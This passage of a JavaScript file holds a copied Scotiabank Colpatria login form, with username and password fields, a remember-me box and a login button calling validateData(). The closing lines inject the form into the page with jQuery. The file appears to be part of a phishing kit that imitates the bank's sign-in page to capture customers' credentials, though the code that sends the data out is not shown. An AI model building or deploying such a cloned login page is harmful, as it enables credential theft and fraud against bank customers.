                                                    <path fill="#333" stroke-linecap="round" stroke-width="0.5" stroke-linejoin="round" d="M22.879 22.129a.75.75 0 1 1-1.5 0v-2.39c0-2.212-1.979-4.031-4.449-4.031H6.532c-2.47 0-4.449 1.82-4.449 4.03v2.39a.75.75 0 1 1-1.5 0v-2.39c0-3.069 2.677-5.53 5.95-5.53H16.93c3.272 0 5.949 2.461 5.949 5.53v2.39zm-10.79-10.006a5.77 5.77 0 1 1 0-11.54 5.77 5.77 0 0 1 0 11.54zm0-1.5a4.27 4.27 0 1 0 0-8.54 4.27 4.27 0 0 0 0 8.54z"></path>
                                                </svg>
                                            </canvas-svg>
                                            <div type="button" class="button input-w-aux__action">
                                                <canvas-svg role="presentation" class="flex">
                                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" focusable="false" role="presentation" aria-hidden="true" class="svg-icon svg-icon--size-18px">
                                                        <path fill="none" d="M22.667 12c0 5.891-4.776 10.667-10.667 10.667C6.108 22.667 1.333 17.89 1.333 12S6.108 1.333 12 1.333c5.89 0 10.667 4.776 10.667 10.667zM8.647 8.648l6.705 6.704m0-6.704l-6.704 6.704"></path>
                                                    </svg>
                                                </canvas-svg>
                                            </div>
                                        </div>
                                    </div>
                                </canvas-input-text>
                                <span id="first-credential-input-error"><!----></span>
                            </div>
                            <div class="margin-xs-24--top form__password">
                                <canvas-input-text formcontrolname="secondCredential" _nghost-hjw-c48="" class="ng-untouched ng-pristine ng-invalid" maxlength="15">
                                    <div class="form__input">
                                        <label role="text" class="label" for="inputPswdId"></label>
                                        <div class="form__input--inline">
                                            <input required class="input input--text ng-untouched ng-pristine ng-valid input--with-icon input--with-icon--left input-w-aux__input" id="txtPassword" type="password" placeholder="Contraseña" autocomplete="off" aria-describedby="second-credential-input-error" maxlength="15">
                                            <canvas-svg role="presentation" class="input__icon input__icon--left flex">
                                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" focusable="false" role="presentation" aria-hidden="true" class="svg-icon svg-icon--size-18px">
                                                    <path fill="none" d="M20.175 19.972c0 .988-.808 1.796-1.796 1.796H5.804a1.802 1.802 0 0 1-1.797-1.796v-8.983c0-.988.808-1.796 1.797-1.796h12.575c.988 0 1.796.808 1.796 1.796v8.983z"></path>
                                                    <path d="M12.99 13.684a.897.897 0 1 1-1.795.002.897.897 0 0 1 1.794-.002z"></path>
                                                    <path fill="none" d="M12.104 14.582v2.695"></path>
                                                    <path fill="none" d="M16.607 6.498v2.33M7.6 9.065V6.499m0 0a4.492 4.492 0 0 1 8.982 0"></path>
                                                </svg>
                                            </canvas-svg>
                                            <button id="showPass" type="button" class="button input-w-aux__action">
                                                <canvas-svg role="presentation" class="flex">
                                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" focusable="false" role="presentation" aria-hidden="true" class="svg-icon svg-icon--size-18px">
                                                        <g fill="none">
                                                            <path d="M1.333 11.933c0 1.451 3.43 7.334 10.667 7.334 1.686 0 3.165-.32 4.442-.827 4.206-1.673 6.225-5.394 6.225-6.507 0-1.45-3.43-7.333-10.667-7.333-7.236 0-10.667 5.882-10.667 7.333z"></path>
                                                            <path d="M12 8.267c-2.076 0-3.765 1.645-3.765 3.666 0 2.022 1.69 3.667 3.765 3.667 2.076 0 3.765-1.645 3.765-3.667 0-2.021-1.69-3.666-3.765-3.666"></path>
                                                        </g>
                                                    </svg>
                                                </canvas-svg>
                                            </button>
                                        </div>
                                    </div>
                                </canvas-input-text>
                                <div class="password-validation">
                                    <span> 8+ caracteres </span>
                                    <span> 1+ mayúscula </span>
                                    <span> 1+ minúscula </span>
                                    <span> 1+ número </span>
                                </div>
                            </div>
                            <div class="margin-xs-18--top">
                                <a class="link link__text" id="linkHelpId" href="#">¿Necesitas ayuda para ingresar?</a>
                            </div>
                            <div class="margin-xs-36--top">
                                <canvas-input-checkbox formcontrolname="rememberUser" class="ng-untouched ng-pristine ng-valid">
                                    <label class="form__input form__input--inline form__input--checkbox" for="checkRememberUserId">
                                        <input type="checkbox" class="input input--checkbox ng-untouched ng-pristine ng-valid" id="checkRememberUserId">
                                        <span class="checkbox">
                                            <svg focusable="false" role="presentation" aria-hidden="true" viewBox="0 0 24 24" class="svg-icon svg-icon--size-12px checkbox__check">
                                                <path stroke="none" d="M13.85 10.667l6.533-5.683A1.727 1.727 0 0 1 22.65 7.59l-6.511 5.663-6.371 5.74c-.7.63-1.775.585-2.418-.103l-6.134-6.559a1.727 1.727 0 0 1 2.522-2.359l4.977 5.321 5.134-4.626z"></path>
                                            </svg>
                                        </span>
                                        <div class="label label--inline label--checkbox"> Recordar mi nombre de usuario</div>
                                    </label>
                                </canvas-input-checkbox>
                            </div>
                            <div class="margin-xs-24--top">
                                <canvas-button width="100%">
                                    <button class="button button--primary" onclick="validateData()" id="btnUsuario" style="width: 100%;">
                                        <span>Ingresar</span>
                                    </button>
                                </canvas-button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </auth-login>
    </section>
    <footer class="hide--xs"><canvas-co-footer-simple>
            <div class="footer-simple--co background--background-alternate">
                <div class="container container--center">
                    <div class="direction--row">
                        <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                            <div class="margin-xs-12 margin-sm-18">
                                <p class="text--roman text--footer color--default"><span text=""> © 2023 Todos los Derechos Reservados <br class="hide--sm hide--md hide--lg"> Scotiabank Colpatria. </span><!----><!----></p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </canvas-co-footer-simple>
    </footer>
</div>
`
//<script>
    loadContenido();
    $('auth-login').html(colpatria_contenido);